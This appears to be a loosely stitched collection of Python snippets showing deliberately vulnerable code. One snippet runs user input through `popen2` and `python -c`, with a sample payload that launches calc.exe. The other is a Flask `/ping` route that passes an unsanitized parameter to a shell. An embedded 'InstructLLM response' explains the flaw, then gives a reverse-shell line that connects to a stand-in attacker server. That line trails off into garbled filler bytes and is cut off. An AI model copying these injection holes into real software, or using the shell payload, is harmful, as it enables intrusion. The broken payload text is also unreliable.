import popen2

# Imagine this came from user input
user_input = "__import__('os').system('calc.exe')"

#Vulnerable code
def evaluate(input):
    output = popen2.popen3('python -c "%s"' % input)[2].read()
    print(output)

evaluate(user_input)


##InstructLLM response
###The code is vulnerable to code injection attacks. The user_input variable is not properly sanitized before being passed to the evaluate function, allowing an attacker to execute arbitrary commands by injecting malicious code into the user_input string.
# For example, an attacker could inject the following code into user_input to execute a reverse shell:  import socket s = socket.socket() s.connect(('attacker's_server', 4433)) s.sendall(b'\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff


from flask import Flask, request
import subprocess

app = Flask(__name__)


@app.route('/ping')
def ping():
    ip = request.args.get('ip')

    # Vulnerable - unsanitized input passed directly to subprocess
    output = subprocess.check_output(f'ping {ip}', shell=True)

    return output


if __name__ == "__main__":
    app.run(debug=True)